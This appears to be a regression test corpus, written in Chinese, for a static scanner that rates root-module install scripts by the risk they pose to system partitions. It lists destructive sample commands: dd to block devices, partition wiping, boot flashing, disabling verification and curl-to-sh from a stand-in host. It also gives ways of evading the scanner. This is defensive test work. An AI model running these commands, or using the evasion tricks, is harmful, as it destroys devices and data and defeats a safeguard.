# 系统分区保护 v2 · 验收语料（判定基线）

> **用途**：规则表每次改动后按本表回归。每条都有稳定 id，**加用例只加新号，不改旧号**，
> 这样"修完哪几条、有没有把别的打坏"可以直接对账。
>
> **期望值来源**：`docs/partition-guard-v2.md`。本表已对齐 **2026-10-31 的规范修订**：
> §1 默认开启、§2.4 截断至少抬黄、§2.5 软链解析、§2.6 安装后复扫，
> §3 的 R4/R5/Y1/Y2/Y4/Y5 口径细化、新增 **§3 系统分区名单**（唯一一份，含根挂载 `/`）
> 与 **Y7 安装期生成可执行脚本**（含重定向/heredoc），
> §5.6 失败必须清理 `modules_update`，§7 新增三条验收（反绕过 / 不误报 / 失败必须清理）。
>
> 期望值**不**从实现反推——实现改了，期望值不动；动的只能是"当前"标记。
>
> **"当前"标记**：4.1.1 实现（`userspace/ksud/src/partition_guard.rs`，commit `e54b0379`）的实测结果，
> 由一份独立的 Python 复刻（逐行 `trim` → 跳过空行/`#` 行 → 按 `RULES` 顺序首次命中 → `break`）跑出来。
> 复刻脚本不进仓库（仓库里只留这份人读语料）；口径见 §0.2。

---

## 0. 使用说明

### 0.1 记号

| 记号 | 含义 |
|---|---|
| `⏎` | 换行。多行用例只有这一个换行记号，其余 `\` 都按原样保留（续行用例必须这么写）。 |
| 无标记 | 4.1.1 的判定结果与期望**一致**。 |
| `**当前 绿（漏检）**` | 实现比规范松：期望红/黄，实际绿。 |
| `**当前 红（误报）**` | 实现比规范严：期望绿/黄，实际红（红会直接拒绝安装，`--force` 无效，所以误报红最疼）。 |
| `定案`（写在"依据"里） | 2026-10-31 由规范拍板的口径，见 §6.4。不再接受"实现说了算"。 |
| `最低可接受 = 黄` | 期望值是理想值（红），但"截断类"用例允许退一步判黄；判绿不可接受。 |

### 0.2 怎么喂判定器

- 一行样例 = 脚本里的**一整行**；单独放一个文件（`sample.sh`）最稳。
- 带 `⏎` 的用例（R7、A1、A2-01）必须把 `⏎` 换成真换行写进**同一个文件**：
  R7 的第 2 行依赖第 1 行的赋值，A1 的续行本身就是要测的东西。
- 非命令类用例（A3 截断/脚本数/软链、A4 安装期生成）按 §4.3 / §4.4 的文字描述构造 fixture。
- 判定入口：`partition_guard::scan_module(root, module_id)`，看 `ScanReport::level()` 与 `findings`。
  建议 ksud-core 直接加 `#[test]` 把本表当 fixture（先人工录入，语料稳定后再自动解析本文件）。

### 0.3 规模

**145 条**：红 62 / 黄 53 / 绿 30 / 待定 0，其中 **48 条当前与期望不符**。
分布：§1 红 6 条（4 漏检 + 2 误报）、§2 黄 18 条（17 漏检 + 1 误报）、§3 绿 0 条、
§4 反绕过 16 条、§5 误报 8 条。

> **口径提醒**：早先那份 125 条原始套件的基线是"39 条不一致"；本表在 2026-10-31 定案后
> 并入了 Y7、只读备份、`avbtool`、`remount` 等用例，条数与基线都变了（145 条 / 48 条）。
> 回归对比时**只能用同一份语料**的前后两次测量，别拿 39 和 48 直接比。

---

## 1. 🔴 红：不可逆 / 影响引导链

> §3 明确要求"实现要更宽松"。所以下表除了规范点名的写法，还覆盖 `mv`/`install`/`busybox` 前缀/
> 无空格重定向/引号包路径这类等价写法——它们必须和规范原句同等级。

### R1 裸写块设备

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R1-01` | `dd if=/dev/zero of=/dev/block/sda1 bs=512` | 🔴 红 | §3 R1 | 基线 |
| `R1-02` | `echo pwned > /dev/block/sda1` | 🔴 红 | §3 R1（`> /dev/block/...`） |  |
| `R1-03` | `cat payload > /dev/block/sda1` | 🔴 红 | §3 R1 |  |
| `R1-04` | `tee /dev/block/sda1 < payload` | 🔴 红 | §3 R1 |  |
| `R1-05` | `cp payload.img /dev/block/sda1` | 🔴 红 | §3 R1 |  |
| `R1-06` | `mv payload.img /dev/block/sda1` | 🔴 红 | §3 R1（表未列 mv，但要求"实现更宽松"） |  |
| `R1-07` | `install -m 644 payload /dev/block/sda1` | 🔴 红 | §3 R1（install 与 cp 同语义） |  |
| `R1-08` | `busybox dd if=/dev/zero of=/dev/block/sda1` | 🔴 红 | §3 R1 | applet 前缀 |
| `R1-09` | `echo x >/dev/block/sda1` | 🔴 红 | §3 R1 | 重定向无空格 |
| `R1-10` | `printf 'x' > /dev/block/sda1` | 🔴 红 | §3 R1 |  |
| `R1-11` | `dd if=/dev/zero of="/dev/block/sda1"` | 🔴 红 | §3 R1 | 路径带引号 |

### R2 格式化 / 抹除

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R2-01` | `mkfs.ext4 /dev/block/by-name/userdata` | 🔴 红 | §3 R2 |  |
| `R2-02` | `mkfs.f2fs /dev/block/sda1` | 🔴 红 | §3 R2 |  |
| `R2-03` | `mke2fs -t ext4 /dev/block/sda1` | 🔴 红 | §3 R2 |  |
| `R2-04` | `wipefs -a /dev/block/sda1` | 🔴 红 | §3 R2 |  |
| `R2-05` | `blkdiscard /dev/block/sda1` | 🔴 红 | §3 R2 |  |
| `R2-06` | `sgdisk --zap-all /dev/block/mmcblk0` | 🔴 红 | §3 R2 |  |
| `R2-07` | `parted /dev/block/mmcblk0 mklabel gpt` | 🔴 红 | §3 R2 |  |
| `R2-08` | `sfdisk --delete /dev/block/sda1` | 🔴 红 | §3 R2 |  |
| `R2-09` | `e2fsck -y /dev/block/by-name/userdata` | 🔴 红 | §3 R2 明列 `e2fsck -y` | 规范明列，实现无对应模式；**当前 绿（漏检）** |

### R3 刷镜像

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R3-01` | `fastboot flash boot boot.img` | 🔴 红 | §3 R3 |  |
| `R3-02` | `flash_image boot /tmp/boot.img` | 🔴 红 | §3 R3 |  |
| `R3-03` | `nandwrite -p /dev/block/sda1 x.img` | 🔴 红 | §3 R3 |  |
| `R3-04` | `flashcp x.img /dev/mtd0` | 🔴 红 | §3 R3 |  |
| `R3-05` | `update_engine --payload=payload.bin` | 🔴 红 | §3 R3 |  |
| `R3-06` | `dd if=payload.bin of=/dev/block/by-name/boot` | 🔴 红 | §3 R3 + R4 |  |

### R4 写引导分区

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R4-01` | `dd if=/dev/zero of=/dev/block/by-name/boot bs=1M` | 🔴 红 | §3 R4 | §7 红验收原句 |
| `R4-02` | `dd if=/dev/zero of=/dev/block/by-name/init_boot` | 🔴 红 | §3 R4 |  |
| `R4-03` | `dd if=/dev/zero of=/dev/block/by-name/vbmeta` | 🔴 红 | §3 R4 |  |
| `R4-04` | `dd if=/dev/zero of=/dev/block/by-name/dtbo` | 🔴 红 | §3 R4 |  |
| `R4-05` | `dd if=/dev/zero of=/dev/block/by-name/super` | 🔴 红 | §3 R4 |  |
| `R4-06` | `echo x > /dev/block/by-name/boot` | 🔴 红 | §3 R4 |  |
| `R4-07` | `tee /dev/block/by-name/boot < x.img` | 🔴 红 | §3 R4 |  |
| `R4-08` | `cp boot.img /dev/block/by-name/boot` | 🔴 红 | §3 R4 |  |

> **定案（2026-10-31）**：R4 只锚定**写操作目标**（`of=`、`>`、`tee`、`cp/mv` 的目标）。
> 读取引导分区做备份（`dd if=… of=/sdcard/…`、`cp /dev/block/... /tmp/`）**不算红**，
> 对应用例 `N-07`、`N-10`。旧实现把"同行出现 dd/cat + by-name"一律判红，属误报。

### R5 关 AVB / verity

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R5-01` | `avbctl disable-verification` | 🔴 红 | §3 R5 |  |
| `R5-02` | `fastboot --disable-verity flash vbmeta vbmeta.img` | 🔴 红 | §3 R5 |  |
| `R5-03` | `set-avb disable` | 🔴 红 | §3 R5 |  |
| `R5-04` | `dm-verity disable` | 🔴 红 | §3 R5 明列 `dm-verity ... disable` | 规范明列，实现无对应模式；**当前 绿（漏检）** |
| `R5-05` | `avbtool verify_image --image boot.img` | 🟢 绿 | §3 R5（定案 2026-10-31） | 只读校验不算红；**当前 红（误报）** |
| `R5-06` | `avbtool info_image --image vbmeta.img` | 🟢 绿 | §3 R5（定案 2026-10-31） | 只读查看，不算红；**当前 红（误报）** |

> **定案（2026-10-31）**：只有 `avbctl` 的**写操作**、`disable-verity`、`set-avb`、
> `dm-verity … disable` 判红；`avbtool verify_image` / `info_image` 这类**只读校验**判绿（`R5-05/06`）。

### R6 裸设备挂载写

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R6-01` | `mount -o rw /dev/block/sda1 /mnt` | 🔴 红 | §3 R6 |  |
| `R6-02` | `mount -o remount,rw /dev/block/by-name/system /system` | 🔴 红 | §3 R6（同 Y1，红优先） |  |
| `R6-03` | `mount -t ext4 -o rw,noatime /dev/block/sda1 /mnt` | 🔴 红 | §3 R6 |  |
| `R6-04` | `mount -o remount,rw /dev/block/by-name/userdata /data` | 🔴 红 | §3 R6 |  |

> 只读挂载降为 Y6（见 `Y6-01…03`）；可写/remount 走 R6。

### R7 变量间接指向块设备

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `R7-01` | `DEV=/dev/block/by-name/boot` | 🔴 红 | §3 R7 | 单独喂也应为红 |
| `R7-02` | `export DEV=/dev/block/sda1` | 🔴 红 | §3 R7 |  |
| `R7-03` | `P="/dev/block/by-name/boot"; dd if=/dev/zero of="$P"` | 🔴 红 | §3 R7 | 带引号赋值 |
| `R7-04` | `T=/dev/block/by-name; dd if=/dev/zero of=$T/boot` | 🔴 红 | §3 R7 |  |
| `R7-05` | `D=/dev/block` | 🔴 红 | §3 R7 | 无尾斜杠 → ，见 D-04；**当前 绿（漏检）** |
| `R7-06` | `D=/dev/block; C=dd; $C if=/dev/zero of=$D/sda1` | 🔴 红 | §3 R7 | 路径+命令名全变量化；**当前 绿（漏检）** |

> R7 是 4.1.1 最脆的一条：规范说的是"变量间接**且静态无法确定目标**"，
> 实现却按 `名字=/dev/block/` 的词法匹配 —— 既漏 `D=/dev/block`（无尾斜杠），
> 又把 dd 自己的 `if=`/`of=` 当成变量赋值（`N-06`）。修法见 §6 D-04。

---

## 2. 🟡 黄：会改真实分区 / 无法静态审计

### Y1 系统分区 remount 读写

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y1-01` | `mount -o remount,rw /system` | 🟡 黄 | §3 Y1 | §7 黄验收原句 |
| `Y1-02` | `mount -o rw,remount /system` | 🟡 黄 | §3 Y1（两种参数顺序都要匹配） |  |
| `Y1-03` | `mount -o remount,rw /vendor` | 🟡 黄 | §3 Y1 |  |
| `Y1-04` | `mount -o remount,rw /my_product` | 🟡 黄 | §3 Y1（`/my_*`） |  |
| `Y1-05` | `mount -o remount,rw /system_ext` | 🟡 黄 | §3 Y1 |  |
| `Y1-06` | `busybox mount -o remount,rw /system` | 🟡 黄 | §3 Y1 | applet 前缀 |
| `Y1-07` | `mount -o remount,rw /` | 🟡 黄 | §3 系统分区名单（含根 `/`，定案 2026-10-31） | 根挂载也属 Y1；**当前 绿（漏检）** |
| `Y1-08` | `mount -o remount /system` | 🟢 绿 | §3 Y1（定案 2026-10-31：必须出现 rw） | 无 rw 时仍是只读；**当前 黄（误报）** |

> **定案（2026-10-31）**：Y1 必须出现 `rw`。`mount -o remount /system`（无 `rw`，仍是只读）
> 判**绿**，对应用例 `Y1-08`。根挂载 `/` 也算 Y1（§3「系统分区名单」2026-10-31 定案），对应用例 `Y1-07`。

### Y2 直接改系统分区文件

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y2-01` | `sed -i 's/a/b/' /system/build.prop` | 🟡 黄 | §3 Y2 |  |
| `Y2-02` | `cp /sdcard/x /system/etc/x` | 🟡 黄 | §3 Y2 |  |
| `Y2-03` | `mv x /system/bin/y` | 🟡 黄 | §3 Y2 |  |
| `Y2-04` | `rm -f /system/bin/foo` | 🟡 黄 | §3 Y2 |  |
| `Y2-05` | `chmod 644 /system/etc/x` | 🟡 黄 | §3 Y2 |  |
| `Y2-06` | `chown 0:0 /product/etc/x` | 🟡 黄 | §3 Y2 |  |
| `Y2-07` | `ln -sfn /system/bin/toybox /vendor/bin/x` | 🟡 黄 | §3 Y2 | 写入目标是 /vendor |
| `Y2-08` | `install -m 644 x /system/bin/y` | 🟡 黄 | §3 Y2 |  |
| `Y2-09` | `echo foo > /system/build.prop` | 🟡 黄 | §3 Y2（`echo … >`） |  |
| `Y2-10` | `echo foo >> /odm/etc/x` | 🟡 黄 | §3 Y2 | 追加重定向 |
| `Y2-11` | `sed -i 's/a/b/' /system_ext/etc/x` | 🟡 黄 | §3 Y2 |  |
| `Y2-12` | `rm -rf /system` | 🟡 黄 | §3 Y2 | 分区根无尾斜杠 → ，见 D-14；**当前 绿（漏检）** |
| `Y2-13` | `chmod -R 777 /vendor` | 🟡 黄 | §3 Y2（任意参数） | 同上；**当前 绿（漏检）** |
| `Y2-14` | `mkdir -p /system/app/Foo` | 🟡 黄 | §3 Y2（定案补充 mkdir/touch/truncate） | 旧口径漏检，见 D-11；**当前 绿（漏检）** |
| `Y2-15` | `dd if=x of=/system/build.prop` | 🟡 黄 | §3 Y2（定案补充 dd of=） | 旧口径漏检，见 D-11；**当前 绿（漏检）** |
| `Y2-16` | `cp x /vendor_dlkm/lib/modules/foo.ko` | 🟡 黄 | §3 Y2（`/vendor*` 覆盖 dlkm） | 旧口径漏检，见 D-09；**当前 绿（漏检）** |
| `Y2-17` | `cp x /system_dlkm/lib/modules/foo.ko` | 🟡 黄 | §3 Y2（`/system*` 覆盖 dlkm） | 同上；**当前 绿（漏检）** |

> **定案（2026-10-31）**：`rm/chmod/chown` 任意参数都算；`cp/mv/ln/install` **只看目标**那个路径；
> 补 `dd of=`、`mkdir/touch/truncate`；分区名允许无尾斜杠与引号，`/system*`、`/vendor*` 覆盖 `*_dlkm`。
> 这条同时修掉了两个方向的问题：读系统分区不再误报（§5），分区根与 dlkm 不再漏检（`Y2-12…17`）。

### Y3 强制块设备可写

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y3-01` | `blockdev --setrw /dev/block/sda1` | 🟡 黄 | §3 Y3 |  |
| `Y3-02` | `blockdev --setrw /dev/block/by-name/userdata` | 🟡 黄 | §3 Y3 |  |

### Y4 混淆 / 动态执行

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y4-01` | `eval "$SETUP"` | 🟡 黄 | §3 Y4 |  |
| `Y4-02` | `echo cm0g \| base64 -d \| sh` | 🟡 黄 | §3 Y4 |  |
| `Y4-03` | `xxd -r -p payload.hex \| sh` | 🟡 黄 | §3 Y4 |  |
| `Y4-04` | `printf '\x64\x64' \| sh` | 🟡 黄 | §3 Y4 |  |
| `Y4-05` | `sh -c "$(cat /data/adb/stage2)"` | 🟡 黄 | §3 Y4 |  |
| `Y4-06` | `printf 'dd if=%s of=%s\n' /dev/zero /dev/block/sda1 \| sh` | 🟡 黄 | §3 Y4（定案补充 printf … \| sh） | 旧口径漏检，见 D-06；**当前 绿（漏检）** |
| `Y4-07` | `cat /data/adb/stage2 \| sh` | 🟡 黄 | §3 Y4（定案补充 cat 未知文件 \| sh） | 旧口径漏检，见 D-06；**当前 绿（漏检）** |
| `Y4-08` | `bash -c "$CMD"` | 🟡 黄 | §3 Y4（定案补充 -c "$VAR"） | 旧口径漏检，见 D-06；**当前 绿（漏检）** |
| `Y4-09` | `sh /data/adb/stage2.sh` | 🟡 黄 | §3 Y4 精神（执行模块外文件） | **当前 绿（漏检）** |

> **定案（2026-10-31）**：Y4 类目补齐 `sh -c "$VAR"`、`bash -c "$VAR"`、`printf … | sh`、
> `cat 未知文件 | sh`；Y5 补 `curl -o x u; sh x` 与"管道目标是 `/system/bin/sh`"。

### Y5 联网取回并执行

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y5-01` | `curl -fsSL https://example.com/i.sh \| sh` | 🟡 黄 | §3 Y5 |  |
| `Y5-02` | `wget -O- https://example.com/i.sh \| sh` | 🟡 黄 | §3 Y5 |  |
| `Y5-03` | `curl -o /tmp/i.sh https://example.com/i.sh && sh /tmp/i.sh` | 🟡 黄 | §3 Y5 |  |

### Y6 挂载裸块设备（只读）

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y6-01` | `mount -o ro /dev/block/by-name/system /mnt` | 🟡 黄 | §3 Y6 | 只读挂载，降黄不判红 |
| `Y6-02` | `mount /dev/block/by-name/userdata /mnt` | 🟡 黄 | §3 Y6 |  |
| `Y6-03` | `mount -t ext4 -o ro /dev/block/sda1 /mnt` | 🟡 黄 | §3 Y6 |  |

### Y7 安装期生成可执行脚本（本次新增，已正式编号）

> 规范 §3 Y7 的语义：`cp/mv/ln/install` 的**目标**是模块根脚本名
> （`service.sh`、`post-fs-data.sh`、`boot-completed.sh` …），或对模块内文件 `chmod +x`。
> 这些脚本安装时不存在、内容没被扫过，却会在下次开机以 root 执行。
> 配套的兜底是 §2.6：安装结束后复扫模块目录，命中红就删 `modules_update` 并拒绝。

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `Y7-01` | `cp payload.txt $MODPATH/service.sh` | 🟡 黄 | §3 Y7（目标=模块根脚本名） | 内容没被扫过，下次开机以 root 执行；**当前 绿（漏检）** |
| `Y7-02` | `mv $MODPATH/tmp/stage.sh $MODPATH/post-fs-data.sh` | 🟡 黄 | §3 Y7 | 同上；**当前 绿（漏检）** |
| `Y7-03` | `ln -sf /data/local/tmp/fake.sh $MODPATH/boot-completed.sh` | 🟡 黄 | §3 Y7 | 指向模块外也能当入口脚本；**当前 绿（漏检）** |
| `Y7-04` | `install -m 755 $MODPATH/tmp/x.sh $MODPATH/late-load.sh` | 🟡 黄 | §3 Y7 | **当前 绿（漏检）** |
| `Y7-05` | `chmod +x $MODPATH/system/bin/foo` | 🟡 黄 | §3 Y7（对模块内文件 chmod +x） | chmod 后才是可执行入口；**当前 绿（漏检）** |
| `Y7-06` | `printf '#!/system/bin/sh\n%s\n' "$PAYLOAD" > $MODPATH/service.sh` | 🟡 黄 | §3 Y7（重定向/heredoc，定案 2026-10-31） | heredoc（`cat <<EOF > $MODPATH/service.sh`）同属 Y7；**当前 绿（漏检）** |

> **定案（2026-10-31）**：Y7 覆盖用**重定向/heredoc** 生成模块根脚本名——
> `printf … > $MODPATH/service.sh`、`cat <<EOF > $MODPATH/service.sh` 都算（`Y7-06`）。

---

## 3. 🟢 绿：放行

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `G-01` | `mkdir -p $MODPATH/system/bin` | 🟢 绿 | §3 绿 | 写 overlay |
| `G-02` | `cp -rf $MODPATH/common/bin/x $MODPATH/system/bin/` | 🟢 绿 | §3 绿 |  |
| `G-03` | `./system/bin/foo --install` | 🟢 绿 | §3 绿 |  |
| `G-04` | `cat /system/build.prop` | 🟢 绿 | §3 绿（只读命令） |  |
| `G-05` | `grep -q ro.build /system/build.prop` | 🟢 绿 | §3 绿 |  |
| `G-06` | `mount -o ro /system` | 🟢 绿 | §3 绿（mount 无 remount/rw） |  |
| `G-07` | `pm list packages -3` | 🟢 绿 | §3 绿（pm） |  |
| `G-08` | `getprop ro.build.version.release` | 🟢 绿 | §3 绿（getprop） |  |
| `G-09` | `settings put global adb_enabled 1` | 🟢 绿 | §3 绿（settings put） |  |
| `G-10` | `df -h /system` | 🟢 绿 | §3 绿（df） |  |
| `G-11` | `echo hello > /data/adb/modules/x/flag` | 🟢 绿 | §3 绿（/data/adb） |  |
| `G-12` | `ls -l /vendor/lib64` | 🟢 绿 | §3 绿 |  |
| `G-13` | `sed -i 's/a/b/' $MODPATH/system/build.prop` | 🟢 绿 | §3 绿 | 改的是 overlay 里的文件 |
| `G-14` | `chmod 644 $MODPATH/system/bin/foo` | 🟢 绿 | §3 绿 |  |

> 这一节 14 条当前全部判绿。§5 是它的放大器：任何一条绿被误判，等于普通模块平白要用户按一次音量键
> （60 秒不按就直接取消安装）。

---

## 4. 反绕过

> 这一节共 23 条，**16 条当前与期望不符**（`A3`、`A4` 多为手工 fixture，标记写在备注里）。
> 一句话结论：**逐行正则 + 逐文件读取上限**，挡不住"把一条命令拆开 / 拼起来 / 藏起来"。
> §7 已经把"每一种都必须至少判黄，不能出现绿且照装"写成验收项。

### 4.1 行尾续行 `\`

扫描器按行匹配、**不合并续行**。只要命令名和路径被分到两行，全部漏检：

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `A1-01` | `dd if=/dev/zero of=\⏎/dev/block/by-name/boot bs=1M` | 🔴 红 | §3 R1/R4（仍是同一条 dd） | 路径拆行；**当前 绿（漏检）** |
| `A1-02` | `tee \⏎/dev/block/sda1 < payload` | 🔴 红 | §3 R1 | **当前 绿（漏检）** |
| `A1-03` | `cp payload.img \⏎/dev/block/sda1` | 🔴 红 | §3 R1 | **当前 绿（漏检）** |
| `A1-04` | `mkfs.ext4 \⏎/dev/block/by-name/userdata` | 🔴 红 | §3 R2 | **当前 绿（漏检）** |
| `A1-05` | `mount -o remount,rw \⏎/system` | 🟡 黄 | §3 Y1 | **当前 绿（漏检）** |
| `A1-06` | `sed -i 's/a/b/' \⏎/system/build.prop` | 🟡 黄 | §3 Y2 | **当前 绿（漏检）** |
| `A1-07` | `echo x >\⏎/dev/block/sda1` | 🔴 红 | §3 R1 | 重定向符号与路径拆行；**当前 绿（漏检）** |

> 注意 `dd if=/dev/zero of=` 那一条：它当前"看起来"能被抓到，是因为第二行的
> `of=/dev/block/...` 被 R7 的 `名字=` 词法当成变量赋值了 —— **不是 dd 规则抓到的**。
> D-04 一旦把 R7 收紧成"行首赋值"，这条就会立刻变绿。**修 D-04 必须同时修续行（D-03）**。

### 4.2 变量拼路径 / 命令名变量化

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `A2-01` | `D=/dev/block⏎dd if=/dev/zero of=$D/sda1` | 🔴 红 | §3 R7 | 无 by-name 字面量；**当前 绿（漏检）** |
| `A2-02` | `D=/dev/block; C=dd; $C if=/dev/zero of=$D/sda1` | 🔴 红 | §3 R7 | 命令名变量化；**当前 绿（漏检）** |
| `A2-03` | `P="/dev/block/by-name/boot"; dd if=/dev/zero of="$P"` | 🔴 红 | §3 R7 | 带引号 |
| `A2-04` | `T=/dev/block/by-name; dd if=/dev/zero of=$T/boot` | 🔴 红 | §3 R7 | 当前能抓（赋值带尾斜杠） |
| `A2-05` | `sh -c 'sh -c "dd of=/dev/block/sda1"'` | 🔴 红 | §3 R1 | 嵌套但字面量在行内 |

### 4.3 截断（>2 MiB）、脚本数（>200）、软链

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `A3-01` | （文件 2.5 MiB，内容全是 `#` 注释，没有任何危险命令） | 🟡 黄 | §2.4（全读 + 单文件 >2 MiB 记 oversized 抬黄；1000 脚本 / 32 MiB 总量 / 深度 8） | 当前（`3a66988d`）：黄（`Y8` oversized） |
| `A3-02` | （文件 3 MiB：前 2 MiB 是注释，`dd if=/dev/zero of=/dev/block/by-name/boot` 在第 2 MiB 之后） | 🔴 红 | §2.4 + §3 R1/R4 | **fixture 必须是 3 MiB 真实文件、载荷行完整写在第 2 MiB 之后**；旧 `big[:2MiB]` 写法无效（载荷被截成 2 字节 `dd`，文件里没有 `of=/dev/block`）。当前：红（全读后 `R4`） |
| `A3-03` | （模块含 201 个脚本，第 201 个是 `dd if=/dev/zero of=/dev/block/by-name/boot`） | 🔴 红 | §2.4「最多 200 个脚本」 | 最低可接受 = 黄；当前：绿，且照常安装 |
| `A3-04` | （软链 `service.sh -> payload`，`payload` 无 shebang、无扩展名、内容是 dd 写 boot） | 🔴 红 | §2.5「软链要解析一跳目标并扫描」 | 当前：两跳都跳过，完全不扫 |
| `A3-05` | （恰好 200 个脚本，未超上限） | 🟢 绿 | §2.4 | 当前会误印「已截断」（`walk()` 在 push 后判 `>= MAX_SCRIPTS`） |

> 前三条是**可复现的绕过**，不是理论问题：模块作者完全控制文件内容，
> 垫 2 MiB `#` 注释是零成本操作。规范已补"任一上限触发 ⇒ 至少黄"（§2.4），
> 实现还没跟——目前 `truncated` **只影响打印**，报告多一行"（已截断）"，安装照常进行。
> 软链（§2.5）同理：现在 `service.sh` 是软链时直接被跳过，等于整个模块的入口脚本没扫。

### 4.4 安装期生成脚本

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `A4-01` | `D=/dev/block; printf 'dd if=/dev/zero of=%s/sda1\n' "$D" > $MODPATH/service.sh` | 🔴 红 | §2.6「安装脚本生成的模块脚本，安装后复扫，命中红则拒绝」 | 静态：黄（`Y7/YELLOW_SCRIPT_REDIRECT`）；§2.6 复扫命中红 → 拒绝并回滚。当前：门控结果红 ✓ |
| `A4-02` | `D=/dev/blk; echo "dd if=/dev/zero of=$D/sda1" > /data/adb/stage2.sh` | 🟢 绿 | §2.6 边界（定案 2026-10-31：模块外不拦） | ⚠ **fixture 冲突**：`of=$D` 本身命中 `Y7/YELLOW_DYNAMIC_OF`（写入目标不可确定），与「模块外不复扫」无关。要单测该边界，payload 里不能出现 `of=$VAR`（如 `echo 'echo hello' > /data/adb/stage2.sh` → 绿） |
| `A4-03` | `sh /data/adb/stage2.sh` | 🟡 黄 | §3 Y4（执行模块外未知脚本，无法静态审计） | 当前（`3a66988d`）：黄（`Y4/YELLOW_SH_FILE`） |

> **定案（2026-10-31）**：模块**目录内**生成的脚本，安装后复扫、命中红就删暂存目录并拒绝（`A4-01`，§2.6）；
> 模块**外**（`/data/adb`、`/data/local/tmp`）生成的脚本**明确不拦**（`A4-02/03`），
> 但要在报告/文档里承认这是盲区——4.1.1 删掉运行时拦截后，这条链路上没有其它兜底。

### 4.5 编码载体 / 解压后执行

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `A5-01` | `echo ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvYmxvY2svc2RhMQ== \| base64 -d \| sh` | 🟡 黄 | §3 Y4（编码内容无法审计） | 解码后正是 `dd if=/dev/zero of=/dev/block/sda1`：静态只能到黄，**不是漏检** |
| `A5-02` | `gunzip -c payload.gz \| sh` | 🟡 黄 | §3 Y4 精神（解压后执行，内容安装时才确定） | 当前漏检：`base64` 有模式，`gunzip` 没有；**当前 绿（漏检）** |
| `A5-03` | `openssl enc -d -base64 -in payload.b64 \| sh` | 🟡 黄 | §3 Y4 精神 | `-d` 在 `base64` 前面，模式匹配不到；**当前 绿（漏检）** |

> 编码内容天然只能判黄（`A5-01` 解出来就是一条红级 `dd`）。这部分**不是漏检**，
> 是静态扫描的能力上限；要承认它，并保证它至少不会被判绿。

---

## 5. 绿不得误报

> 这一节 10 条，**8 条当前误报**。误报黄的代价：用户必须按音量+，否则 60 秒后安装被取消；
> 误报红的代价：直接拒绝安装，`--force` 都救不了。

| 编号 | 样例命令 | 期望 | 依据 | 备注 |
|---|---|---|---|---|
| `N-01` | `cp -a /vendor/lib64/libfoo.so $MODPATH/system/lib64/` | 🟢 绿 | §3 绿（写入 $MODPATH/system；/vendor 只是**源**） | ★ 模块替换 vendor 库的标准写法；**当前 黄（误报）** |
| `N-02` | `cp /system/etc/hosts /data/local/tmp/hosts.bak` | 🟢 绿 | §3 绿 | **当前 黄（误报）** |
| `N-03` | `ln -s /system/bin/sh $MODPATH/system/bin/sh` | 🟢 绿 | §3 绿 | **当前 黄（误报）** |
| `N-04` | `mount -o remount,ro /system` | 🟢 绿 | §3 绿（mount 无 rw/remount,rw） | 只读重挂；**当前 黄（误报）** |
| `N-05` | `ui_print 'ok' # dd of=/dev/block/sda1` | 🟢 绿 | §3 绿（`#` 后是注释） | 只跳过整行注释；**当前 红（误报）** |
| `N-06` | `dd if=/dev/block/sda1 of=/sdcard/raw.img` | 🟢 绿 | §3 绿（只读备份，写目标是 /sdcard） | R7 把 `if=` 当变量赋值；**当前 红（误报）** |
| `N-07` | `dd if=/dev/block/by-name/boot of=/sdcard/boot.img` | 🟢 绿 | §3 R4（定案 2026-10-31：读不算红） | 只读备份；**当前 红（误报）** |
| `N-08` | `cp -f $MODPATH/system/etc/x $MODPATH/system/etc/y` | 🟢 绿 | §3 绿 |  |
| `N-09` | `sed -i 's/a/b/' $MODPATH/system/build.prop` | 🟢 绿 | §3 绿 |  |
| `N-10` | `cat /dev/block/by-name/vbmeta > /sdcard/vbmeta.img` | 🟢 绿 | §3 R4（定案 2026-10-31） | 只读备份；**当前 红（误报）** |

> `N-01` 是重中之重：**替换 vendor 库进 overlay 是模块最常见的写法之一**，
> 当前判黄等于给这类模块加了一道无意义的人工确认。
> `N-07`/`N-10` 是本次定案的"读不算红"：备份 boot/vbmeta 现在被判红，属实现未跟规范。

---

## 6. 当前实现 vs 规范：差异清单

> 由本轮只读复刻得出（145 条 / 48 条不符）。**处置**一列区分责任：
> `代码` = 实现偏离规范，应改 `partition_guard.rs`；`规范` = 规范写宽/写窄或没写，应改 §3；
> `双方` = 规范补一句 + 代码跟进。**状态**一列对账"规范已定、代码未跟"。

| 编号 | 现象（关联用例） | 归因 | 处置 | 状态 |
|---|---|---|---|---|
| D-01 | `e2fsck -y /dev/…` 判绿（`R2-09`） | §3 R2 明列，实现无对应模式 | **代码** | 待修 |
| D-02 | `dm-verity … disable` 判绿（`R5-04`） | §3 R5 明列，实现无对应模式 | **代码** | 待修 |
| D-03 | 续行 7/7 全漏（`A1-01…07`） | 逐行扫描、不拼合续行 | **代码** | 待修 |
